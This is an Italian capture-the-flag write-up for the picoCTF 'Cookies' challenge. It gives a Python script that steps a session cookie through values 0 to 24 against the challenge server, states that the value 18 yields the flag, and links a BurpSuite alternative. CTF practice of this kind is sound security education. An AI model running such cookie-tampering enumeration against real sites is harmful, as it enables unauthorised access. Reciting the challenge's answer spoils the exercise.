# Cookies
*Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)*
<br>

## Soluzione 1
Inserendo *"snickerdoodle"* come suggerito dalla casella di testo, la pagina setta un cookie con nome **name** e valore **0**. Cambiando il valore di questo cookie la pagina ci ritorna degli output differenti.

Possiamo scrivere uno script python nel quale **il valore del cookie viene cambiato sequenzialmente** e ci vengono ritornati i differenti output.

```python
import requests

url = "http://mercury.picoctf.net:21485/check"

for i in range(0, 25):
    cookie_val = str(i)
    cookie_send = {'name': cookie_val}

    r = requests.get(url, cookies = cookie_send)
    ris = r.text.split("<p style=\"text-align:center; font-size:30px;\"><b>")[1].split("</b></p>")[0]

    print(f"Val utilizzato {i}, risultato: {ris}")
```

Vediamo che cambiando in **18** il valore del cookie ci viene ritornata la flag. 

*Guarda lo script python nella cartella dell'esercizio*

## Soluzione 2
È possibile risolvere questa challenge mediante **BurpSuite**.

*Consulta il [writeup](https://github.com/xnomas/PicoCTF-2021-Writeups/blob/main/Cookies/README.md)*

---
- [Soluzione mediante BurpSuite](https://github.com/xnomas/PicoCTF-2021-Writeups/blob/main/Cookies/README.md)